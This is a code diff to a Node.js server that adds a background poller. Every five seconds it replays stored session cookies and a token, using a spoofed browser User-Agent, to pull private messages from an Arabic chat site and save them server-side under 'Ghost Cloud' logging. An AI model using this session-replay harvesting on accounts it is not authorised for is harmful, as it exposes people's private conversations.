@@ -224,6 +224,185 @@ function initChatSocket() {
     }
 }
 
+// ==========================================
+// 24/7 Background HTTP Poller Engine
+// ==========================================
+let pollIntervalTimer = null;
+let isPollingActive = false;
+let lastPollStats = {
+    lastPollTime: null,
+    status: 'idle',
+    lastUnreadFound: 0,
+    totalCycles: 0,
+    lastError: null
+};
+
+async function pollArabicChatOnce() {
+    if (!sessionData.utk && !sessionData.cookies) {
+        lastPollStats.status = 'no_credentials';
+        return;
+    }
+    if (isPollingActive) return;
+    isPollingActive = true;
+
+    try {
+        const headers = {
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'User-Agent': sessionData.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
+            'Origin': SITE_URL,
+            'Referer': `${SITE_URL}/`
+        };
+        if (sessionData.cookies) {
+            headers['Cookie'] = sessionData.cookies;
+        }
+
+        const bodyData = sessionData.utk ? `token=${encodeURIComponent(sessionData.utk)}` : '';
+
+        // 1. Poll private_notify.php
+        const notifyRes = await fetch(`${SITE_URL}/system/box/private_notify.php`, {
+            method: 'POST',
+            headers: headers,
+            body: bodyData
+        });
+
+        if (!notifyRes.ok) {
+            lastPollStats.status = `HTTP_${notifyRes.status}`;
+            isPollingActive = false;
+            return;
+        }
+
+        const notifyHtml = await notifyRes.text();
+        lastPollStats.lastPollTime = new Date().toISOString();
+        lastPollStats.totalCycles++;
+        lastPollStats.status = 'ok';
+
+        if (!notifyHtml || notifyHtml.trim().length === 0) {
+            isPollingActive = false;
+            return;
+        }
+
+        // 2. Parse contacts from notifyHtml
+        const rawBlocks = notifyHtml.split(/(?=<div[^>]*class="[^"]*ulist_item)/i);
+        const peersToCheck = new Map();
+
+        for (const block of rawBlocks) {
+            const peerMatch = block.match(/data="(\d+)"/i);
+            if (!peerMatch) continue;
+            const peerId = peerMatch[1];
+            if (!peerId || peerId === '0') continue;
+
+            let name = 'مستخدم ' + peerId;
+            const valMatch = block.match(/value="([^"]+)"/i);
+            if (valMatch && valMatch[1]) {
+                name = valMatch[1].trim();
+            } else {
+                const nameMatch = block.match(/class="[^"]*(?:username|user_name)[^"]*"[^>]*>([^<]+)</i);
+                if (nameMatch && nameMatch[1]) name = nameMatch[1].trim();
+            }
+
+            let avatar = 'default_images/avatar/default_avatar.png';
+            const avMatch = block.match(/data-av="([^"]+)"/i) || block.match(/<img[^>]*src="([^"]+)"/i);
+            if (avMatch && avMatch[1]) avatar = avMatch[1];
+
+            const unreadMatch = block.match(/class="[^"]*pm_notify[^"]*"[^>]*>(\d+)</i);
+            const unreadCount = unreadMatch ? parseInt(unreadMatch[1], 10) : 0;
+
+            peersToCheck.set(peerId, { peerId, name, avatar, unreadCount });
+        }
+
+        let newMessagesCaptured = 0;
+
+        for (const [peerId, info] of peersToCheck.entries()) {
+            const hasExisting = messages.some(m => m.peerId === peerId);
+            if (info.unreadCount > 0 || !hasExisting) {
+                try {
+                    const boxBody = `target=${encodeURIComponent(peerId)}&token=${encodeURIComponent(sessionData.utk || '')}`;
+                    const boxRes = await fetch(`${SITE_URL}/system/private_box.php`, {
+                        method: 'POST',
+                        headers: headers,
+                        body: boxBody
+                    });
+
+                    if (boxRes.ok) {
+                        const boxData = await boxRes.json();
+                        if (boxData && boxData.priv_logs && boxData.priv_logs != 99) {
+                            const logsHtml = String(boxData.priv_logs);
+                            const liItems = logsHtml.split(/(?=<li[^>]*class="[^"]*prlog)/i);
+
+                            for (const liHtml of liItems) {
+                                if (!liHtml.includes('prlog')) continue;
+                                const idMatch = liHtml.match(/data-id="([^"]+)"/i);
+                                const msgId = idMatch ? idMatch[1] : ('polled_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5));
+
+                                const isTarget = /class="[^"]*target_private[^"]*"/i.test(liHtml);
+                                const isHunter = /class="[^"]*hunter_private[^"]*"/i.test(liHtml);
+                                const type = isTarget ? 'received' : 'sent';
+
+                                let text = '';
+                                let html = '';
+                                const contentMatch = liHtml.match(/class="[^"]*(?:target_private|hunter_private)[^"]*"[^>]*>([\s\S]*?)<\/div>/i);
+                                if (contentMatch && contentMatch[1]) {
+                                    html = contentMatch[1].trim();
+                                    text = stripHtml(html);
+                                }
+
+                                let time = '';
+                                const timeMatch = liHtml.match(/class="[^"]*p[t]?date[^"]*"[^>]*>([\s\S]*?)<\/p>/i);
+                                if (timeMatch && timeMatch[1]) {
+                                    time = timeMatch[1].trim();
+                                }
+
+                                if (text || html) {
+                                    const exists = messages.some(m => m.id === msgId || (m.peerId === peerId && m.type === type && (m.text === text || m.html === html) && m.time === time));
+                                    if (!exists) {
+                                        const newMsg = {
+                                            id: msgId,
+                                            peerId: String(peerId),
+                                            name: info.name,
+                                            avatar: info.avatar,
+                                            text: text || stripHtml(html),
+                                            html: html || text,
+                                            time: time || new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' }),
+                                            timestamp: Date.now(),
+                                            type: type,
+                                            synced: false
+                                        };
+                                        messages.push(newMsg);
+                                        newMessagesCaptured++;
+                                        console.log(`[Cloud Poller] 👻 Captured offline ${type} message from ${info.name} (${peerId}): ${text.substring(0, 40)}`);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                } catch (e) {
+                    console.warn(`[Cloud Poller] Error fetching private_box for peer ${peerId}:`, e.message);
+                }
+            }
+        }
+
+        if (newMessagesCaptured > 0) {
+            if (messages.length > 1500) messages = messages.slice(-1500);
+            saveJson(MESSAGES_FILE, messages);
+            console.log(`[Cloud Poller] Successfully saved ${newMessagesCaptured} new offline message(s) to cloud database!`);
+        }
+
+    } catch (err) {
+        lastPollStats.lastError = err.message;
+        console.warn('[Cloud Poller] Polling cycle error:', err.message);
+    } finally {
+        isPollingActive = false;
+    }
+}
+
+function startPollingEngine() {
+    if (pollIntervalTimer) clearInterval(pollIntervalTimer);
+    console.log('[Cloud Poller] Starting 24/7 background polling engine (interval: 5s)...');
+    setTimeout(pollArabicChatOnce, 1500);
+    pollIntervalTimer = setInterval(pollArabicChatOnce, 5000);
+}
+
 // Middleware
 app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '10mb' }));
@@ -540,10 +719,16 @@ app.get('/api/status', (req, res) => {
         ok: true,
         socketConnected: socketConnected,
         siteUrl: SITE_URL,
-        hasSession: !!sessionData.cookies,
+        hasSession: !!(sessionData.utk || sessionData.cookies),
+        sessionUtkPresent: !!sessionData.utk,
+        sessionCookiesPresent: !!sessionData.cookies,
         sessionLastUpdated: sessionData.lastUpdated,
         lastConnectedTime: lastConnectedTime,
         lastError: lastError,
+        pollerActive: true,
+        lastPollTime: lastPollStats.lastPollTime,
+        lastPollStatus: lastPollStats.status,
+        lastPollCycles: lastPollStats.totalCycles,
         totalMessages: messages.length,
         unsyncedCount: messages.filter(m => !m.synced).length
     });
@@ -613,6 +798,39 @@ app.post('/api/messages/sent', requireAuth, (req, res) => {
     res.json({ ok: true, data: sentItem });
 });
 
+// 4.1 Record Incoming Message from Extension (Two-Way Sync)
+app.post('/api/messages/incoming', requireAuth, (req, res) => {
+    const { peerId, name, message } = req.body;
+    if (!peerId || !message) {
+        return res.status(400).json({ ok: false, error: 'Missing peerId or message' });
+    }
+
+    const incomingItem = {
+        id: message.id || ('msg_in_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5)),
+        peerId: String(peerId),
+        name: name || ('مستخدم ' + peerId),
+        avatar: message.avatar || 'default_images/avatar/default_avatar.png',
+        text: message.text || stripHtml(message.html || ''),
+        html: message.html || message.text || '',
+        time: message.time || new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' }),
+        timestamp: message.timestamp || Date.now(),
+        type: 'received',
+        synced: true // Already handled by the reporting extension
+    };
+
+    const exists = messages.some(m => m.id === incomingItem.id || (m.peerId === incomingItem.peerId && m.type === 'received' && (m.text === incomingItem.text || m.html === incomingItem.html) && m.time === incomingItem.time));
+    if (!exists) {
+        messages.push(incomingItem);
+        if (messages.length > 1500) {
+            messages = messages.slice(-1500);
+        }
+        saveJson(MESSAGES_FILE, messages);
+        console.log(`[Ghost Cloud] Two-Way Sync: Recorded incoming message from ${incomingItem.name} (${incomingItem.peerId})`);
+    }
+
+    res.json({ ok: true, data: incomingItem });
+});
+
 // 5. Get Full Conversations (For Mobile Web Viewer)
 app.get('/api/conversations', requireAuth, (req, res) => {
     const map = {};
@@ -667,6 +885,7 @@ app.post('/api/session', requireAuth, (req, res) => {
 
     console.log('[API] Session updated from extension! Reconnecting socket with fresh session...');
     initChatSocket();
+    setTimeout(pollArabicChatOnce, 300);
 
     res.json({
         ok: true,
@@ -720,6 +939,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🌐 Target: ${SITE_URL}${SOCKET_PATH}`);
     console.log(`=================================================`);
 
-    // Initial socket connect
+    // Initial socket connect & Polling Engine boot
     initChatSocket();
+    startPollingEngine();
 });
